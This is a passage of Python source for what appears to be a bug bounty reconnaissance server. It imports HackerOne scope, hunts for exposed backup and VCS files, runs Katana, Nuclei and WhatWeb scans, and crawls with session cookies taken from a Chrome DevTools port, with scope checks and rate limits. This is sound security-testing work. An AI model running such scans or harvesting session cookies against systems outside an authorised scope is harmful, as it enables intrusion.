        SCOPE = ScopeConfig(
            program_name=program.name,
            primary_targets=scope_data.get("primary_targets", []),
            secondary_targets=scope_data.get("secondary_targets", []),
            rules=scope_data.get("rules", {}),
        )
        scope_set = True
        print(f"[H1] Set active scope: {program.name}", file=sys.stderr)
    
    # Build bounty ranges dict
    bounty_ranges = {}
    for br in program.bounty_ranges:
        bounty_ranges[br.severity.value] = {
            "min": br.min_amount,
            "max": br.max_amount,
        }
    
    return H1ImportResult(
        program_name=program.name,
        program_handle=program.handle,
        program_url=program.url,
        in_scope_count=len(program.in_scope_assets),
        out_of_scope_count=len(program.out_of_scope_assets),
        primary_targets=scope_data.get("primary_targets", []),
        secondary_targets=scope_data.get("secondary_targets", []),
        bounty_ranges=bounty_ranges,
        scope_file=scope_file,
        scope_set=scope_set,
    )


@app.post("/mcp/search_h1_programs")
def search_h1_programs(req: H1SearchRequest):
    """
    Search for bug bounty programs on HackerOne.
    
    Returns a list of matching programs with basic info.
    Use /mcp/import_h1_scope to fetch full details for a specific program.
    """
    try:
        from tools.h1_client import H1Client, H1ClientError
    except ImportError as e:
        raise HTTPException(
            status_code=500,
            detail=f"H1 client not available: {e}",
        )
    
    try:
        client = H1Client()
        results = client.search_programs(
            query=req.query,
            offers_bounties=req.bounties_only,
            limit=req.limit,
        )
    except H1ClientError as e:
        raise HTTPException(status_code=502, detail=f"Search failed: {e}")
    
    return {
        "query": req.query,
        "results": results,
        "total": len(results),
    }


@app.get("/mcp/h1_program/{handle}")
def get_h1_program(handle: str):
    """
    Get detailed information about a HackerOne program.
    
    Returns full program details including:
    - Scope (in-scope and out-of-scope assets)
    - Bounty ranges
    - Policy and rules
    - Response times
    """
    try:
        from tools.h1_client import H1Client, H1NotFoundError, H1ClientError
    except ImportError as e:
        raise HTTPException(status_code=500, detail=f"H1 client not available: {e}")
    
    try:
        client = H1Client()
        program = client.fetch_program(handle)
    except H1NotFoundError:
        raise HTTPException(status_code=404, detail=f"Program not found: {handle}")
    except H1ClientError as e:
        raise HTTPException(status_code=502, detail=f"Error fetching program: {e}")
    
    return program.to_dict()


@app.post("/mcp/set_auth")
def set_auth(cfg: AuthConfig):
    """Register per-host auth configuration (currently header-based).

    This enforces that the host is within the current scope and stores
    auth configs in-memory for use by host_profile auth surface.
    """

    host = _enforce_scope(cfg.host)
    AUTH_CONFIGS[host] = AuthConfig(host=host, type=cfg.type, headers=cfg.headers)
    return {"status": "ok", "host": host}


# ---------- background job helpers ----------

def _spawn_job(cmd_argv: List[str], job_kind: str, artifact_dir: str) -> str:
    """Spawn a background job and track it in JOB_STORE.

    This is intentionally simple: it runs the given command in a thread,
    captures stdout/stderr to files in ``artifact_dir``, and records
    basic status so callers can poll via /mcp/job/{id}.
    """

    os.makedirs(artifact_dir, exist_ok=True)

    job_id = str(uuid4())
    stdout_path = os.path.join(artifact_dir, f"{job_id}.out.log")
    stderr_path = os.path.join(artifact_dir, f"{job_id}.err.log")

    JOB_STORE[job_id] = {
        "id": job_id,
        "kind": job_kind,
        "cmd": cmd_argv,
        "artifact_dir": artifact_dir,
        "status": "queued",
        "stdout": stdout_path,
        "stderr": stderr_path,
        "returncode": None,
    }

    def _runner():
        JOB_STORE[job_id]["status"] = "running"
        try:
            with open(stdout_path, "w", encoding="utf-8") as so, open(
                stderr_path, "w", encoding="utf-8"
            ) as se:
                proc = subprocess.run(
                    cmd_argv,
                    cwd=os.path.dirname(__file__),
                    stdout=so,
                    stderr=se,
                    text=True,
                )
            JOB_STORE[job_id]["returncode"] = proc.returncode
            JOB_STORE[job_id]["status"] = "finished" if proc.returncode == 0 else "error"
        except Exception as e:
            JOB_STORE[job_id]["status"] = "error"
            JOB_STORE[job_id]["error"] = str(e)

    t = threading.Thread(target=_runner, daemon=True)
    t.start()

    return job_id

@app.post("/mcp/run_js_miner")
def run_js_miner(body: Dict[str, Any]):
    """Kick off a JS/config miner job for a given base URL.

    This is a thin MCP wrapper around ``tools/js_miner.py`` that
    enforces scope, spawns a background job, and returns a job id
    plus the artifact directory where results will be written.
    """

    base_url = body.get("base_url") or body.get("url")
    if not base_url:
        raise HTTPException(status_code=400, detail="Missing 'base_url' in request body.")

    host = _enforce_scope(base_url)

    artifact_dir = os.path.join(ARTIFACTS_DIR, "js_miner", host)

    script_path = os.path.join(os.path.dirname(__file__), "tools", "js_miner.py")
    if not os.path.exists(script_path):
        raise HTTPException(status_code=500, detail=f"js_miner.py not found at {script_path}")

    cmd = [
        sys.executable,
        script_path,
        "--base-url",
        base_url,
        "--output-dir",
        artifact_dir,
    ]

    job_id = _spawn_job(cmd, job_kind="js_miner", artifact_dir=artifact_dir)
    return {"job_id": job_id, "artifact_dir": artifact_dir}


@app.post("/mcp/run_backup_hunt")
def run_backup_hunt(body: Dict[str, Any]):
    """Kick off a backup/VCS file hunter for a given base URL.

    This runs tools/backup_hunt.py in the background against a single
    base URL, looking for common backup/config artifacts.
    """

    base_url = body.get("base_url") or body.get("url")
    if not base_url:
        raise HTTPException(status_code=400, detail="Missing 'base_url' in request body.")

    host = _enforce_scope(base_url)

    artifact_dir = os.path.join(ARTIFACTS_DIR, "backup_hunt", host)

    script_path = os.path.join(os.path.dirname(__file__), "tools", "backup_hunt.py")
    if not os.path.exists(script_path):
        raise HTTPException(status_code=500, detail=f"backup_hunt.py not found at {script_path}")

    cmd = [
        sys.executable,
        script_path,
        "--base-url",
        base_url,
        "--output-dir",
        artifact_dir,
    ]

    job_id = _spawn_job(cmd, job_kind="backup_hunt", artifact_dir=artifact_dir)
    return {"job_id": job_id, "artifact_dir": artifact_dir}


@app.get("/mcp/job/{job_id}")
def get_job(job_id: str):
    job = JOB_STORE.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return job

# ---------- Katana (unauth + auth) + Fingerprinting MCP endpoints ----------

@app.post("/mcp/run_katana_nuclei", response_model=KatanaNucleiResult)
def run_katana_nuclei(req: KatanaNucleiRequest):
    """
    Run Katana + Nuclei recon via tools/katana_nuclei_recon.py for a single target.
    Returns a path to a JSON file containing nuclei findings and the count.
    """
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    host_key = req.target.replace("://", "_").replace("/", "_")
    out_name = req.output_name or f"katana_nuclei_{host_key}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)

    script_path = os.path.join(os.path.dirname(__file__), "tools", "katana_nuclei_recon.py")
    if not os.path.exists(script_path):
        raise HTTPException(
            status_code=500,
            detail=f"katana_nuclei_recon.py not found at {script_path}",
        )

    env = os.environ.copy()
    env.setdefault("OUTPUT_DIR", OUTPUT_DIR)
    
    # Pass rate limits to the script via environment variables
    katana_rate_limit = get_katana_rate_limit()
    nuclei_rate_limit = get_nuclei_rate_limit()
    env["KATANA_RATE_LIMIT"] = str(katana_rate_limit)
    env["NUCLEI_RATE_LIMIT"] = str(nuclei_rate_limit)
    
    # Pass lab testing flag if set
    if IS_LAB_ENV:
        env["LAB_TESTING"] = "true"
    
    print(f"[KATANA+NUCLEI] Using rate limits: Katana={katana_rate_limit} req/sec, Nuclei={nuclei_rate_limit} req/sec (lab_mode={IS_LAB_ENV})", file=sys.stderr)

    cmd = [
        sys.executable,
        script_path,
        "--target",
        req.target,
        "--output",
        out_name,
        "--mode",
        req.mode or "recon",
    ]

    rate_limit_wait()
    try:
        proc = subprocess.run(
            cmd,
            env=env,
            cwd=os.path.dirname(__file__),
            capture_output=True,
            text=True,
            timeout=3600,
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error running katana+nuclei: {e}")

    if proc.returncode != 0:
        raise HTTPException(
            status_code=500,
            detail=f"katana_nuclei_recon.py failed: {proc.stderr.strip()}",
        )

    if not os.path.exists(out_path):
        raise HTTPException(
            status_code=500,
            detail=f"Expected output file not found: {out_path}",
        )

    with open(out_path, "r", encoding="utf-8") as fh:
        data = json.load(fh)

    findings = data.get("nuclei_findings", [])
    findings_file = os.path.join(
        OUTPUT_DIR,
        os.path.splitext(out_name)[0] + "_findings.json",
    )
    with open(findings_file, "w", encoding="utf-8") as fh:
        json.dump(findings, fh, indent=2)

    return KatanaNucleiResult(
        target=req.target,
        katana_count=data.get("katana", {}).get("count", 0),
        findings_file=findings_file,
        findings_count=len(findings),
    )


@app.post("/mcp/run_katana_auth", response_model=KatanaAuthResult)
def run_katana_auth(req: KatanaAuthRequest):
    """Run authenticated Katana helper against a live browser session.

    This endpoint:
    - Auto-detects Chrome DevTools on port 9222 if session_ws_url not provided
    - Extracts authenticated session cookies via Chrome DevTools Protocol
    - Runs Katana with extracted cookies for authenticated crawling
    - Merges authenticated endpoints into host_profile.web.auth_katana
    - Tags authenticated resources for RAG knowledge store
    """

    target = _enforce_scope(req.target)

    # Derive host key and output path under ARTIFACTS_DIR/katana_auth/<host>/
    host_key = target.replace("://", "_").replace("/", "_")
    base_dir = os.path.join(ARTIFACTS_DIR, "katana_auth", host_key)
    os.makedirs(base_dir, exist_ok=True)

    out_name = req.output_name or f"katana_auth_{host_key}_{int(time.time())}.json"
    out_path = os.path.join(base_dir, out_name)

    script_path = os.path.join(os.path.dirname(__file__), "tools", "katana_auth_helper.py")
    if not os.path.exists(script_path):
        raise HTTPException(
            status_code=500,
            detail=f"katana_auth_helper.py not found at {script_path}",
        )

    env = os.environ.copy()
    env.setdefault("OUTPUT_DIR", OUTPUT_DIR)
    env.setdefault("ARTIFACTS_DIR", ARTIFACTS_DIR)
    env.setdefault("DOCKER_NETWORK", DOCKER_NETWORK)

    cmd = [
        sys.executable,
        script_path,
        "--target",
        target,
        "--output",
        out_path,
    ]

    # Auto-detect Chrome DevTools if not provided
    if req.session_ws_url:
        cmd.extend(["--ws-url", req.session_ws_url])
    else:
        # Try auto-detection on default port 9222
        try:
            resp = requests.get("http://localhost:9222/json", timeout=2)
            if resp.status_code == 200:
                tabs = resp.json()
                if tabs and tabs[0].get("webSocketDebuggerUrl"):
                    ws_url = tabs[0]["webSocketDebuggerUrl"]
                    cmd.extend(["--ws-url", ws_url])
        except Exception:
            # Auto-detection failed, helper will handle gracefully
            pass

    rate_limit_wait()
    try:
        proc = subprocess.run(
            cmd,
            env=env,
            cwd=os.path.dirname(__file__),
            capture_output=True,
            text=True,
            timeout=3600,
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error running katana_auth_helper.py: {e}")

    if proc.returncode != 0:
        raise HTTPException(
            status_code=500,
            detail=f"katana_auth_helper.py failed: {proc.stderr.strip()}",
        )

    if not os.path.exists(out_path):
        raise HTTPException(
            status_code=500,
            detail=f"Expected output file not found: {out_path}",
        )

    try:
        with open(out_path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to load katana_auth_helper output: {e}")

    urls = data.get("urls") or []
    api_endpoints = data.get("api_endpoints") or []
    cookies = data.get("cookies") or []
    graphql_endpoints = data.get("graphql_endpoints") or []

    # Merge authenticated data into host_profile
    # Extract host from target
    from urllib.parse import urlparse
    parsed = urlparse(target)
    host = parsed.netloc.split(":")[0] if parsed.netloc else target

    # Load or create host profile
    profile = _load_host_profile_snapshot(host, latest=True) or {
        "host": host,
        "created": time.time(),
        "web": {},
    }

    # Merge authenticated Katana data
    if not profile.get("web"):
        profile["web"] = {}
    
    if not profile["web"].get("auth_katana"):
        profile["web"]["auth_katana"] = {
            "urls": [],
            "api_endpoints": [],
            "graphql_endpoints": [],
            "cookies_count": 0,
        }

    # Merge URLs (deduplicate)
    existing_urls = set(profile["web"]["auth_katana"].get("urls", []))
    for url in urls:
        if url not in existing_urls:
            existing_urls.add(url)
            profile["web"]["auth_katana"]["urls"].append(url)

    # Merge API endpoints
    existing_apis = {(ep.get("url"), ep.get("method", "GET")) for ep in profile["web"]["auth_katana"].get("api_endpoints", [])}
    for ep in api_endpoints:
        ep_key = (ep.get("url"), ep.get("method", "GET"))
        if ep_key not in existing_apis:
            existing_apis.add(ep_key)
            profile["web"]["auth_katana"]["api_endpoints"].append(ep)

    # Merge GraphQL endpoints
    existing_graphql = set(profile["web"]["auth_katana"].get("graphql_endpoints", []))
    for gql_ep in graphql_endpoints:
        if gql_ep not in existing_graphql:
            existing_graphql.add(gql_ep)
            profile["web"]["auth_katana"]["graphql_endpoints"].append(gql_ep)

    profile["web"]["auth_katana"]["cookies_count"] = len(cookies)
    profile["web"]["auth_katana"]["urls"] = sorted(list(existing_urls))
    profile["web"]["auth_katana"]["last_updated"] = time.time()

    # Save updated profile
    _save_host_profile_snapshot(host, profile)

    # Tag authenticated resources in RAG (if RAG is enabled)
    # This would be done via RAG endpoints if available
    try:
        # Attempt to tag in RAG knowledge store
        if urls or api_endpoints:
            # Note: RAG tagging would be done via /mcp/rag_search or similar endpoints
            # For now, we just ensure the data is in host_profile
            pass
    except Exception:
        pass

    return KatanaAuthResult(
        target=target,
        output_file=out_path,
        auth_katana_count=len(urls),
    )


def _run_whatweb_internal(target: str) -> Optional[Dict[str, Any]]:
    """Internal helper to run WhatWeb via Docker and return parsed results.
    
    Used by both /mcp/run_fingerprints and auto-trigger in host_profile.
    Returns dict with 'technologies' list and 'plugins' dict, or None on failure.
    """
    cmd = [
        "docker", "run", "--rm",
        "--network", DOCKER_NETWORK,
        "bberastegui/whatweb",
        "-v",
        target,
    ]
    
    try:
        proc = subprocess.run(
            cmd,
            cwd=os.path.dirname(__file__),
            capture_output=True,
            text=True,
            timeout=120,
        )
    except Exception as e:
        print(f"[WHATWEB] Error running Docker: {e}", file=sys.stderr)
        return None
    
    if proc.returncode != 0:
        print(f"[WHATWEB] Non-zero exit: {proc.stderr or proc.stdout}", file=sys.stderr)
    
    # Parse technologies from output
    technologies: List[str] = []
    plugins: Dict[str, Any] = {}
    
    for line in (proc.stdout or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(" ")
        if not parts:
            continue
        for token in parts[1:]:
            if "[" in token and "]" in token:
                tech = token.split("[", 1)[0]
                if tech:
                    technologies.append(tech)
                    # Extract version if present
                    version_part = token.split("[", 1)[1].rstrip("]")
                    if version_part:
                        plugins[tech] = {"version": version_part}
    
    return {
        "technologies": technologies,
        "plugins": plugins,
        "raw_output": proc.stdout,
    }


def _run_security_headers_internal(url: str) -> Optional[Dict[str, Any]]:
    """Internal helper to check security headers and return results.
    
    Used by host_profile for auto-checking. Returns dict with headers, issues, and score.
    """
    try:
        # Validate URL is in scope
        validated_host = _enforce_scope(url)
        
        # Reconstruct safe URL
        parsed = urlparse(url)
        scheme = parsed.scheme or "http"
        safe_url = f"{scheme}://{validated_host}"
        if parsed.port and parsed.port not in (80, 443):
            safe_url = f"{scheme}://{validated_host}:{parsed.port}"
        if parsed.path:
            safe_url += parsed.path

        resp = requests.get(safe_url, timeout=10, allow_redirects=True)
        headers = dict(resp.headers)
        
        issues: List[Dict[str, Any]] = []
        score = 100

        # Check Content-Security-Policy
        csp = headers.get("Content-Security-Policy", "").lower()
        if not csp:
            issues.append({
                "header": "Content-Security-Policy",
                "severity": "high",
                "issue": "Missing CSP header",
            })
            score -= 30
        elif "unsafe-inline" in csp or "unsafe-eval" in csp:
            issues.append({
                "header": "Content-Security-Policy",
                "severity": "medium",
                "issue": "CSP contains unsafe directives",
            })
            score -= 15

        # Check HSTS
        hsts = headers.get("Strict-Transport-Security", "")
        if not hsts:
            issues.append({
                "header": "Strict-Transport-Security",
                "severity": "medium",
                "issue": "Missing HSTS header",
            })
            score -= 15

        # Check X-Frame-Options
        xfo = headers.get("X-Frame-Options", "").lower()
        if not xfo:
            issues.append({
                "header": "X-Frame-Options",
                "severity": "medium",
                "issue": "Missing X-Frame-Options",
            })
            score -= 10

        # Check X-Content-Type-Options
        if headers.get("X-Content-Type-Options", "").lower() != "nosniff":
            issues.append({
                "header": "X-Content-Type-Options",
                "severity": "medium",
                "issue": "Missing or incorrect X-Content-Type-Options",
            })
            score -= 10

        score = max(0, score)

        return {
            "url": safe_url,
            "headers": headers,
            "issues": issues,
            "score": score,
        }
    except Exception as e:
        print(f"[SECURITY_HEADERS] Internal check failed: {e}", file=sys.stderr)
        return None


@app.post("/mcp/run_fingerprints", response_model=FingerprintResult)
def run_fingerprints(req: FingerprintRequest):
    """Run basic technology fingerprinting using WhatWeb via Docker.

    Runs WhatWeb in a Docker container connected to DOCKER_NETWORK,
    writes raw output under ARTIFACTS_DIR/fingerprints/<host>/, then 
    parses a simple technology list when possible.
    """

    target = _enforce_scope(req.target)

    host_key = target.replace("://", "_").replace("/", "_")
    base_dir = os.path.join(ARTIFACTS_DIR, "fingerprints", host_key)
    os.makedirs(base_dir, exist_ok=True)

    ts = int(time.time())
    out_name = f"whatweb_{ts}.txt"
    out_path = os.path.join(base_dir, out_name)

    # Use Docker to run whatweb, connected to the lab network
    cmd = [
        "docker", "run", "--rm",
        "--network", DOCKER_NETWORK,
        "bberastegui/whatweb",
        "-v",
        target,
    ]

    rate_limit_wait()
    try:
        proc = subprocess.run(
            cmd,
            cwd=os.path.dirname(__file__),
            capture_output=True,
            text=True,
            timeout=300,
        )
    except FileNotFoundError:
        raise HTTPException(status_code=500, detail="Docker not found - required for WhatWeb fingerprinting")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error running fingerprints: {e}")

    # Always write raw stdout/stderr for later inspection
    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write(proc.stdout)
        if proc.stderr:
            fh.write("\n\n# stderr:\n")
            fh.write(proc.stderr)

    if proc.returncode != 0:
        # We still return the artifact, but note that exit code was non-zero.
        raise HTTPException(
            status_code=500,
            detail=f"Fingerprinting tool failed (exit {proc.returncode}); see {out_path}",
        )

    # Heuristic parse: WhatWeb default output is of form:
    #   http://example.com [200 OK] Country[United States] HTTPServer[nginx]
    # Strip ANSI color codes first
    import re
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    clean_output = ansi_escape.sub('', proc.stdout)
    
    technologies: List[str] = []
    for line in clean_output.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(" ")
        if not parts:
            continue
        # Everything after the first token is a plugin-like label
        for token in parts[1:]:
            if "[" in token and "]" in token:
                tech = token.split("[", 1)[0]
                if tech:
                    technologies.append(tech)

    return FingerprintResult(
        target=target,
        output_file=out_path,
        technologies=sorted(sorted(set(technologies))),
    )


@app.post("/mcp/run_whatweb", response_model=WhatWebResult)
def run_whatweb(req: WhatWebRequest):
    """Run WhatWeb fingerprinting via Docker with structured JSON output.

    This endpoint runs WhatWeb in a Docker container and parses the JSON output
    to extract technology fingerprints. Results are stored in artifacts/fingerprints/<host>/
    and can be consumed by host_profile and AI triage.
    """
    # Validate target is in scope and get normalized hostname
    validated_host = _enforce_scope(req.target)

    # Reconstruct a safe URL using only the validated hostname
    # This prevents parser differential attacks where req.target could bypass scope
    parsed = urlparse(req.target)
    scheme = parsed.scheme or "http"
    # Use validated_host (not parsed.netloc) to ensure we scan what we validated
    safe_target = f"{scheme}://{validated_host}"
    if parsed.port and parsed.port not in (80, 443):
        safe_target = f"{scheme}://{validated_host}:{parsed.port}"

    host_key = validated_host.replace("://", "_").replace("/", "_")
    base_dir = os.path.join(ARTIFACTS_DIR, "fingerprints", host_key)
    os.makedirs(base_dir, exist_ok=True)

    ts = int(time.time())
    out_name = f"whatweb_{ts}.json"
    out_path = os.path.join(base_dir, out_name)

    # Check execution mode: Local K8s > AWS Distributed > Local Docker
    if LOCAL_EXECUTOR_AVAILABLE and is_local_k8s_mode():
        # Use local K8s workers
        print(f"[WHATWEB] Using local K8s worker for {safe_target}", file=sys.stderr)
        try:
            executor = LocalExecutor()
            result = executor.submit_and_wait("whatweb", safe_target, timeout=300)
            if result:
                # Convert worker result to WhatWebResult format
                technologies = result.get("technologies", [])
                raw_plugins = result.get("plugins", {})
                result_data = {
                    "target": safe_target,
                    "timestamp": ts,
                    "technologies": sorted(set(technologies)),
                    "plugins": raw_plugins,
                    "raw_stdout": result.get("raw_output", ""),
                    "raw_stderr": result.get("stderr", ""),
                    "exit_code": result.get("exit_code", 0),
                }
                with open(out_path, "w", encoding="utf-8") as fh:
                    json.dump(result_data, fh, indent=2)
                return WhatWebResult(
                    target=safe_target,
                    output_file=out_path,
                    technologies=sorted(set(technologies)),
                    raw_plugins=raw_plugins,
                )
            else:
                raise HTTPException(status_code=500, detail="WhatWeb job timed out or failed in local K8s")
        except HTTPException:
            # Re-raise HTTPException immediately - don't suppress error responses
            raise
        except Exception as e:
            print(f"[WHATWEB] Local K8s execution failed: {e}, falling back to Docker", file=sys.stderr)
            # Fall through to Docker execution
    elif DISTRIBUTED_EXECUTOR_AVAILABLE and is_distributed_mode():
        # Use AWS distributed workers
        print(f"[WHATWEB] Using AWS distributed worker for {safe_target}", file=sys.stderr)
        try:
            executor = DistributedExecutor()
            result = executor.submit_and_wait("whatweb", safe_target, timeout=300)
            if result:
                # Convert worker result to WhatWebResult format
                technologies = result.get("technologies", [])
                raw_plugins = result.get("plugins", {})
                result_data = {
                    "target": safe_target,
                    "timestamp": ts,
                    "technologies": sorted(set(technologies)),
                    "plugins": raw_plugins,
                    "raw_stdout": result.get("raw_output", ""),
                    "raw_stderr": result.get("stderr", ""),
                    "exit_code": result.get("exit_code", 0),
                }
                with open(out_path, "w", encoding="utf-8") as fh:
                    json.dump(result_data, fh, indent=2)
                return WhatWebResult(
                    target=safe_target,
                    output_file=out_path,
                    technologies=sorted(set(technologies)),
                    raw_plugins=raw_plugins,
                )
            else:
                raise HTTPException(status_code=500, detail="WhatWeb job timed out or failed in AWS")
        except HTTPException:
            # Re-raise HTTPException immediately - don't suppress error responses
            raise
        except Exception as e:
            print(f"[WHATWEB] AWS distributed execution failed: {e}, falling back to Docker", file=sys.stderr)
            # Fall through to Docker execution

    # Default: Run WhatWeb via Docker (local execution)
    # Use safe_target (reconstructed from validated components) to prevent scope bypass
    cmd = [
        "docker", "run", "--rm", "--network", DOCKER_NETWORK,
        "bberastegui/whatweb",
        "-a", "3",  # Aggression level 3 (stealthy)
        "--log-json=-",  # JSON output to stdout
        safe_target,
    ]

    print(f"[WHATWEB] Running via Docker: {' '.join(cmd)}", file=sys.stderr)

    rate_limit_wait()
    try:
        proc = subprocess.run(
            cmd,
            cwd=os.path.dirname(__file__),
            capture_output=True,
            text=True,
            timeout=300,
        )
    except FileNotFoundError:
        raise HTTPException(status_code=500, detail="Docker not found - required for WhatWeb")
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=500, detail="WhatWeb timed out after 5 minutes")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error running WhatWeb: {e}")

    # Parse JSON output - WhatWeb outputs one JSON object per line
    technologies: List[str] = []
    raw_plugins: Dict[str, Any] = {}

    for line in proc.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            data = json.loads(line)
            # WhatWeb JSON structure: {"target": "...", "http_status": 200, "plugins": {...}}
            plugins = data.get("plugins", {}) or {}
            for plugin_name, plugin_data in plugins.items():
                technologies.append(plugin_name)
                # Store version info if available
                if isinstance(plugin_data, dict):
                    version = plugin_data.get("version")
                    if version:
                        raw_plugins[plugin_name] = {"version": version}
                    else:
                        raw_plugins[plugin_name] = plugin_data
                else:
                    raw_plugins[plugin_name] = {"detected": True}
        except json.JSONDecodeError:
            continue

    # Store structured result
    result_data = {
        "target": safe_target,  # Use validated target, not raw user input
        "timestamp": ts,
        "technologies": sorted(set(technologies)),
        "plugins": raw_plugins,
        "raw_stdout": proc.stdout,
        "raw_stderr": proc.stderr,
        "exit_code": proc.returncode,
    }

    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result_data, fh, indent=2)

    if proc.returncode != 0 and not technologies:
        raise HTTPException(
            status_code=500,
            detail=f"WhatWeb failed (exit {proc.returncode}): {proc.stderr[:500]}",
        )

    return WhatWebResult(
        target=safe_target,  # Return the validated/safe target, not raw user input
        output_file=out_path,
        technologies=sorted(set(technologies)),
        raw_plugins=raw_plugins,
    )


@app.post("/mcp/host_profile")
def host_profile(req: CloudReconRequest):
    """
    Build or update a host profile from recon outputs (cloud, web, etc.).
    """
    host = _enforce_scope(req.host)

    profile: Dict[str, Any] = {
        "host": host,
        "created": time.time(),
        "cloud": {},
        "web": {},
    }

    # --- existing: load cloud findings, nuclei, etc. (if you have any here) ---

    # --- Katana HTTP surface ingestion (unauthenticated) ---
    katana_prefix = "katana_nuclei_"
    katana_files = [
        f for f in os.listdir(OUTPUT_DIR)
        if f.startswith(katana_prefix)
    ]

    all_urls: List[str] = []
    api_endpoints: List[Dict[str, Any]] = []

    for fname in katana_files:
        kpath = os.path.join(OUTPUT_DIR, fname)
        try:
            with open(kpath, "r", encoding="utf-8") as fh:
                kdata = json.load(fh)
        except Exception:
            continue

        # Skip if not a dict (e.g., old format files that are arrays)
        if not isinstance(kdata, dict):
            continue

        target = kdata.get("target", "") or ""
        # crude match: host (e.g., "localhost:3000") must appear in target URL
        if host not in target:
            continue

        kat = kdata.get("katana", {}) or {}
        all_urls.extend(kat.get("all_urls", []) or [])
        api_endpoints.extend(kat.get("api_candidates", []) or [])

    if all_urls:
        profile["web"]["urls"] = sorted(set(all_urls))

    if api_endpoints:
        profile["web"]["api_endpoints"] = api_endpoints

    # --- Authenticated Katana HTTP surface ingestion (dev-mode) ---
    # Looks for artifacts emitted by /mcp/run_katana_auth under
    # ARTIFACTS_DIR/katana_auth/<host_key>/katana_auth_*.json.
    host_key = host.replace("://", "_").replace("/", "_")
    auth_base = os.path.join(ARTIFACTS_DIR, "katana_auth", host_key)
    auth_urls: List[str] = []
    auth_api_endpoints: List[Dict[str, Any]] = []

    if os.path.isdir(auth_base):
        for fname in sorted(os.listdir(auth_base)):
            if not fname.endswith(".json"):
                continue
            fpath = os.path.join(auth_base, fname)
            try:
                with open(fpath, "r", encoding="utf-8") as fh:
                    data = json.load(fh)
            except Exception:
                continue

            urls = data.get("urls") or []
            if isinstance(urls, list):
                for u in urls:
                    if isinstance(u, str):
                        auth_urls.append(u)

            api_eps = data.get("api_endpoints") or []
            if isinstance(api_eps, list):
                for ep in api_eps:
                    if isinstance(ep, dict):
                        auth_api_endpoints.append(ep)

    if auth_urls or auth_api_endpoints:
        profile["web"]["auth_katana"] = {
            "urls": sorted(set(auth_urls)),
            "api_endpoints": auth_api_endpoints,
            "count": len(set(auth_urls)),
        }

    # --- Fingerprinting ingestion (WhatWeb/compatible) ---
    # Auto-trigger WhatWeb if no recent fingerprint data exists (within 24 hours)
    fp_base = os.path.join(ARTIFACTS_DIR, "fingerprints", host.replace("://", "_").replace("/", "_"))
    fp_tech: List[str] = []
    fp_plugins: Dict[str, Any] = {}
    fp_stale = True  # Assume stale until we find recent data
    
    if os.path.isdir(fp_base):
        # Prefer JSON files (new format), fall back to txt (old format)
        json_files = sorted([f for f in os.listdir(fp_base) if f.startswith("whatweb_") and f.endswith(".json")])
        txt_files = sorted([f for f in os.listdir(fp_base) if f.startswith("whatweb_") and f.endswith(".txt")])
        
        # Try JSON format first (new /mcp/run_whatweb output)
        if json_files:
            latest = os.path.join(fp_base, json_files[-1])
            try:
                with open(latest, "r", encoding="utf-8") as fh:
                    data = json.load(fh)
                fp_tech = data.get("technologies", []) or []
                fp_plugins = data.get("plugins", {}) or {}
                # Check freshness (24 hours)
                file_ts = data.get("timestamp", 0)
                if time.time() - file_ts < 86400:
                    fp_stale = False
            except Exception:
                pass
        
        # Fall back to txt format (old /mcp/run_fingerprints output)
        if not fp_tech and txt_files:
            latest = os.path.join(fp_base, txt_files[-1])
            try:
                with open(latest, "r", encoding="utf-8") as fh:
                    text = fh.read()
                for line in text.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split(" ")
                    for token in parts[1:]:
                        if "[" in token and "]" in token:
                            tech = token.split("[", 1)[0]
                            if tech:
                                fp_tech.append(tech)
                # Check file age for freshness
                file_mtime = os.path.getmtime(latest)
                if time.time() - file_mtime < 86400:
                    fp_stale = False
            except Exception:
                pass
    
    # Auto-trigger WhatWeb if data is stale or missing
    if fp_stale and all_urls:
        # Use the first URL as target for fingerprinting
        target_url = all_urls[0] if all_urls else f"http://{host}"
        try:
            print(f"[HOST_PROFILE] Auto-triggering WhatWeb for {target_url}", file=sys.stderr)
            whatweb_result = _run_whatweb_internal(target_url)
            if whatweb_result:
                fp_tech = whatweb_result.get("technologies", [])
                fp_plugins = whatweb_result.get("plugins", {})
        except Exception as e:
            print(f"[HOST_PROFILE] WhatWeb auto-trigger failed: {e}", file=sys.stderr)

    if fp_tech:
        profile.setdefault("web", {})["fingerprints"] = {
            "technologies": sorted(set(fp_tech)),
            "plugins": fp_plugins,
        }

    # --- Backup hunter ingestion ---
    backup_dir = os.path.join(ARTIFACTS_DIR, "backup_hunt", host)
    backups_exposed: list[Dict[str, Any]] = []
    if os.path.isdir(backup_dir):
        for fname in os.listdir(backup_dir):
            if not fname.endswith("_results.json") and not fname.endswith("backup_hunt_results.json"):
                continue
            fpath = os.path.join(backup_dir, fname)
            try:
                with open(fpath, "r", encoding="utf-8") as fh:
                    data = json.load(fh)
            except Exception:
                continue
            for hit in data.get("hits", []) or []:
                if isinstance(hit, dict):
                    backups_exposed.append(hit)

    if backups_exposed:
        profile.setdefault("web", {})["backups"] = {
            "count": len(backups_exposed),
            "samples": backups_exposed[:20],
        }

    # --- Auth surface ingestion (without exposing secrets) ---
    auth_cfg = AUTH_CONFIGS.get(host)
    if auth_cfg is not None:
        header_names = sorted(list(auth_cfg.headers.keys()))
        vals_lower = " ".join(str(v).lower() for v in auth_cfg.headers.values())
        has_bearer = "bearer " in vals_lower
        has_api_key_style = any(
            k.lower() in {"api-key", "x-api-key", "x-api-key-id", "authorization"}
            for k in header_names
        )
